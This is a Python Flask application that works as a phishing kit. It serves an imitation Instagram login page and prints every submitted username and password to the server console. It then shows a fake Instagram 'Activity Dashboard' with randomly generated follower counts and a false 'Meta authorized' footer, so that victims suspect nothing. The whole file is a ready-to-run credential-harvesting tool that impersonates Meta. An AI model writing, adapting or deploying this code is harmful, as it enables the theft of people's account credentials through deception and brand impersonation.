from flask import Flask, request, render_template_string
import random

app = Flask(__name__)

# ================= Login Page HTML (Instagram UI) =================
LOGIN_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">

<style>
* {
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
                 Roboto, Helvetica, Arial, sans-serif;
}

body {
    margin: 0;
    background: #ffffff;
    min-height: 100vh;
    display: flex;
    justify-content: center;
}

/* Main wrapper */
.app {
    width: 100%;
    max-width: 420px;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding-top: 22px;
    padding-bottom: env(safe-area-inset-bottom);
}

/* Top content */
.content {
    width: 100%;
    padding: 0 24px;
    text-align: center;
    flex: 1;
}

/* Language */
.language {
    font-size: 14px;
    color: #262626;
    margin-bottom: 34px;
}

/* Logo */
.logo img {
    width: 70px;
    height: 70px;
    margin-bottom: 38px;
}

/* Inputs */
.inputs {
    display: flex;
    flex-direction: column;
    gap: 10px;
}

input {
    padding: 14px 12px;
    font-size: 14px;
    border-radius: 10px;
    border: 1px solid #dbdbdb;
    background: #fafafa;
}

input::placeholder {
    color: #8e8e8e;
}

/* Login button */
.login-btn {
    width: 100%;
    margin-top: 12px;
    padding: 12px 0;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 24px;
    font-size: 15px;
    font-weight: 600;
}

/* Forgot */
.forgot {
    margin-top: 18px;
    font-size: 14px;
    color: #262626;
}

/* Create account */
.create {
    margin-top: 36px;
}

.create button {
    width: 100%;
    padding: 12px 0;
    border-radius: 24px;
    border: 1px solid #0095f6;
    background: transparent;
    color: #0095f6;
    font-size: 15px;
    font-weight: 600;
}

/* Bottom section */
.bottom {
    width: 100%;
    text-align: center;
    padding-bottom: env(safe-area-inset-bottom);
}

/* Meta */
.meta {
    font-size: 14px;
    color: #8e8e8e;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 6px;
    margin-bottom: 6px;
}

/* Footer links */
.footer {
    font-size: 12px;
    color: #8e8e8e;
    padding: 0 18px 12px;
    line-height: 1.6;
}
</style>
</head>

<body>

<div class="app">

    <div class="content">
        <div class="language">English (US)</div>

        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
        </div>

        <form action="/login" method="POST">
            <div class="inputs">
                <input type="text" name="username" placeholder="Username, email or mobile number" required>
                <input type="password" name="password" placeholder="Password" required>
            </div>

            <button type="submit" class="login-btn">Log in</button>

            <div class="forgot">Forgot password?</div>

            <div class="create">
                <button type="button">Create new account</button>
            </div>
        </form>
    </div>

    <div class="bottom">
        <div class="meta">
            <span>∞</span>
            <span>Meta</span>
        </div>

        <div class="footer">
            © Meta 2025 · Privacy · Cookie Policy · Terms · English (UK)
        </div>
    </div>

</div>

</body>
</html>
"""

# ================= Results Page HTML =================
RESULTS_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Activity Dashboard</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
body { background-color:#f5f5f7; color:#333; min-height:100vh; position:relative; padding-bottom:50px; }
.header { background: linear-gradient(180deg,#fff 0%,#e9ecef 100%); height:120px; display:flex; justify-content:center; align-items:center; position:relative; padding:10px; }
.insta-logo { font-size:48px; font-weight:bold; font-family:'Billabong', cursive; background: linear-gradient(45deg,#f58529,#dd2a7b,#8134af,#515bd4); -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-align:center; }
.top-nav { display:grid; grid-template-columns:repeat(3,1fr); background:#fff; border-bottom:1px solid #ddd; text-align:center; padding:12px 0; }
.nav-item { display:flex; flex-direction:column; align-items:center; gap:4px; font-size:13px; font-weight:600; color:#444; position:relative; }
.nav-item i { font-size:20px; color:#222; }
.badge { position:absolute; top:-5px; right:25%; background:#ff4757; color:white; font-size:10px; padding:2px 5px; border-radius:10px; border:2px solid #fff; }
.list-container { margin-top:10px; background:#fff; border-radius:12px; overflow:hidden; box-shadow:0 2px 6px rgba(0,0,0,0.05); max-height:calc(100vh-200px); overflow-y:auto; }
.list-item { display:flex; align-items:center; padding:14px 16px; border-bottom:1px solid #f1f1f1; transition: background 0.2s; cursor:pointer; }
.list-item:last-child { border-bottom:none; }
.list-item:active { background-color:#f0f0f0; }
.icon-box { width:35px; font-size:18px; display:flex; justify-content:center; margin-right:12px; position:relative; }
.item-text { flex-grow:1; font-size:15px; font-weight:500; }
.count { font-weight:bold; color:#555; margin-right:8px; }
.arrow { color:#ccc; font-size:14px; }
.trusted-footer { position:fixed; bottom:0; width:100%; background:#fff; text-align:center; font-size:12px; color:#555; padding:5px 0; box-shadow:0 -1px 5px rgba(0,0,0,0.05); }
@media screen and (max-width:480px) {
.insta-logo { font-size:36px; }
.top-nav { padding:10px 0; }
.list-item { padding:10px 12px; }
.icon-box { width:30px; font-size:16px; margin-right:8px; }
.item-text { font-size:14px; }
.count { margin-right:5px; font-size:13px; }
}
</style>
</head>
<body>

<div class="header">
    <div class="insta-logo">Instagram</div>
</div>

<div class="top-nav">
    <div class="nav-item">
        <span class="badge">1</span>
        <i class="fas fa-chart-line"></i>
        Activity Feed
    </div>
    <div class="nav-item">
        <i class="fas fa-play-circle"></i>
        Your Stories
    </div>
    <div class="nav-item">
        <span class="badge">1</span>
        <i class="fas fa-heartbeat"></i>
        Activity Meter
    </div>
</div>

<div class="list-container">
    <div class="list-item">
        <div class="icon-box"><i class="fas fa-plus"></i></div>
        <div class="item-text">New Followers</div>
        <span class="count">{{ followers }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box"><i class="fas fa-minus"></i></div>
        <div class="item-text">Unfollowers</div>
        <span class="count">{{ unfollowed }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box">
            <span class="badge">9+</span>
            <i class="fas fa-user-minus"></i>
        </div>
        <div class="item-text">You Unfollowed</div>
        <span class="count">{{ you_unfollowed }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box"><i class="fas fa-user-friends"></i></div>
        <div class="item-text">Not Following You Back</div>
        <span class="count">{{ not_following_back }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box"><i class="fas fa-user-plus"></i></div>
        <div class="item-text">You Are Not Following Back</div>
        <span class="count">{{ you_not_following }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box">
            <span class="badge">?</span>
            <i class="fas fa-ghost"></i>
        </div>
        <div class="item-text">Ghost Followers</div>
        <span class="count">{{ ghost_followers }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box">
            <span class="badge">?</span>
            <i class="fas fa-ban"></i>
        </div>
        <div class="item-text">Blocked You</div>
        <span class="count">{{ blocked_you }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
</div>

<div class="trusted-footer">
    © 2025 Meta Platforms, Inc. | All rights reserved. Meta authorized
</div>

</body>
</html>
"""

# ================= Flask Routes =================
@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE_HTML)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Print credentials to console
    print(f"\n{'='*50}")
    print("Received credentials:")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print(f"{'='*50}\n")

    # Generate random statistics
    followers = random.randint(100, 1000)
    unfollowed = random.randint(50, 500)
    you_unfollowed = random.randint(50, 600)
    not_following_back = random.randint(50, 500)
    you_not_following = random.randint(50, 600)
    ghost_followers = random.randint(10, 200)
    blocked_you = random.randint(0, 50)

    return render_template_string(
        RESULTS_PAGE_HTML,
        followers=followers,
        unfollowed=unfollowed,
        you_unfollowed=you_unfollowed,
        not_following_back=not_following_back,
        you_not_following=you_not_following,
        ghost_followers=ghost_followers,
        blocked_you=blocked_you
    )

# ================= Main =================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
